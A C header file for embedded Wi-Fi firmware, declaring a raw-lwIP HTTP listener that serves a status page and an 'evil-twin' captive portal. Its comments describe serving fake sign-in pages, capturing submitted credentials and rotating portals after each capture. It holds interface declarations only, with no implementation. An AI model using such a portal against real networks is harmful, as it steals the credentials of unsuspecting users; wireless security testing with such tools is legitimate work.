// M4: raw-lwIP TCP HTTP listener. The Arduino WiFiServer's accept never receives the SoftAP's
// connections (root-caused), so both the WebUI status page AND the evil-twin captive portal serve
// through lwIP's TCP raw API directly (like the DHCP/DNS servers use udp raw).
//   web_lwip_start(render)   - WebUI mode: serve the `render` page to any request.
//   web_lwip_start_portal()  - captive-portal mode: serve a sign-in page, answer OS probes, and
//                              CAPTURE submitted credentials (GET query) for loop() to drain.
#ifndef WEB_LWIP_H
#define WEB_LWIP_H
#include <stddef.h>
#include <stdbool.h>

bool web_lwip_start(void (*render)(char* buf, size_t cap));  // WebUI: bind+listen :80

// captive portal: bind+listen :80, serving the SELECTED page. body=NULL -> built-in generic
// sign-in page. gzip -> adds Content-Encoding: gzip. copy -> stream with TCP_WRITE_FLAG_COPY
// (use for any mutable buffer: customPortal AND the Default page, which is rebuilt per request;
// only immutable flash gzip blobs pass copy=false for zero-copy).
bool web_lwip_start_portal(const char* body, int len, bool gzip, bool copy);

// Swap the served page without rebinding the listener (portal rotation).
void web_lwip_set_portal(const char* body, int len, bool gzip, bool copy);

// Portal root URL, derived by the sketch from the AP SSID. It is advertised in DHCP option 114,
// the 302 Location and the cp.json body, so all three always agree.
void web_lwip_set_urls(const char* root, const char* cpjson);

// Called once per captured credential submission (portal rotation). Runs in the tcpip thread:
// the callback must not block or allocate.
void web_lwip_set_rotate(void (*fn)(void));

bool web_lwip_poll_creds(char* buf, int cap);                // loop() drains captured creds (EV:)
void web_lwip_stop();
#endif
